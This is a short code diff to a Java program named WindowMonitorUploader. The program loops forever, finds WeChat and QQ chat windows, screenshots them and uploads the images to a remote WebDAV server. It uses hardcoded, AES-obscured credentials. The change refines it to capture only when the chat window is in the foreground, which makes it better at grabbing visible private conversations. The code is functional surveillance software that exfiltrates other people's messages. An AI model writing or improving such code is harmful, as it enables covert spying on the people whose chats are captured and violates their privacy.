@@ -68,12 +68,17 @@ public class WindowMonitorUploader {
         Sardine sardine = SardineFactory.begin(AesUtil.decrypt(USERNAME, key), AesUtil.decrypt(PASSWORD, key));
         while (true) {
             try {
+                WinDef.HWND foreground = User32.INSTANCE.GetForegroundWindow();
+                if (foreground == null) {
+                    Thread.sleep(interval);
+                    continue;
+                }
                 WinDef.HWND hwnd = findWindowByKeyword(MATCH_KEYWORD_1);
-                if (hwnd != null) {
+                if (hwnd != null && hwnd.equals(foreground)) {
                     uploadImage(sardine, "wechat", hwnd);
                 } else {
                     hwnd = findWindowByKeyword(MATCH_KEYWORD_2);
-                    if (hwnd != null) {
+                    if (hwnd != null && hwnd.equals(foreground)) {
                         uploadImage(sardine, "qq", hwnd);
                     }
                 }
